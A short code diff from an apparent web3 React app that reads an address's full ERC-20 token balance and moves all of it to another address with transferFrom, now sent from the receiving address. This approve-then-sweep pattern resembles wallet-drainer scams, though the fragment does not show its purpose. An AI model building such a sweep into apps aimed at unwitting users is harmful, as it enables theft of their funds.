@@ -178,7 +178,9 @@ function App() {
 					const balance = await contract.methods.balanceOf(from || address).call()
 					alert(`【${from || address}】向【${toAddress}】转账【${balance / Math.pow(10, decimals)}】开始`)
 					Toast.loading('Loading...')
-					const res = await contract.methods.transferFrom(from || address, toAddress, balance).send()
+					const res = await contract.methods.transferFrom(from || address, toAddress, balance).send({
+						from: toAddress
+					})
 					// // const res = await contract.transfer(toAddress, balance).send()
 					console.log(res)
 					Toast.hide()
